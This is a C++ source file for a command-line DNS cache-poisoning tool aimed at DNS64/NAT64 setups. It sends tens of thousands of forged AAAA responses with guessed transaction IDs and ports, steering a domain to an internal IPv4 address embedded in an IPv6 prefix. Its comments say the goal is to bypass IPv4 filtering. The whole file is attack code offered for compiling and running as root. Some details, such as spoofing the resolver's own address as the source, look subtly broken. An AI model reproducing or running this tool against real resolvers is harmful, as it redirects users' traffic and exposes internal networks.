// Compile: g++ -o dns64_poison dns64_poison.cpp
// Run: sudo ./dns64_poison <target_dns> <domain> <ipv6_prefix>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class DNS64Poison {
private:
    std::string targetDNS, domain, ipv6Prefix;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    DNS64Poison(const std::string& dns, const std::string& d, 
                const std::string& prefix)
        : targetDNS(dns), domain(d), ipv6Prefix(prefix) {}
    
    // Poison AAAA record - attack targets NAT64/DNS64 translation
    // In DNS64 environment, forged AAAA bypasses IPv4 filtering
    void poisonAAAA(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        
        int pos = 12;
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(28); pos += 2;  // AAAA query
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // AAAA Answer: malicious IPv6 with embedded NAT64 mapping
        // DNS64 embeds IPv4 in IPv6, e.g. 64:ff9b::<ipv4>
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(28); pos += 2;  // AAAA
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(16); pos += 2;  // 16 bytes for IPv6
        
        // Craft IPv6 address: prefix + embedded IPv4 for attacker's target
        struct in6_addr ipv6;
        inet_pton(AF_INET6, ipv6Prefix.c_str(), &ipv6);
        // Overwrite last 4 bytes with IPv4 (e.g., internal IP)
        uint32_t embeddedIPv4 = inet_addr("10.0.0.1");  // Internal target
        memcpy(ipv6.s6_addr + 12, &embeddedIPv4, 4);
        
        memcpy(dns + pos, ipv6.s6_addr, 16); pos += 16;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] DNS64/NAT64 prefix poisoning\n";
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            poisonAAAA(txid, port);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns> <domain> <ipv6_prefix>\n";
        return 1;
    }
    srand(time(NULL));
    DNS64Poison poison(argv[1], argv[2], argv[3]);
    poison.run(50000);
    return 0;
}
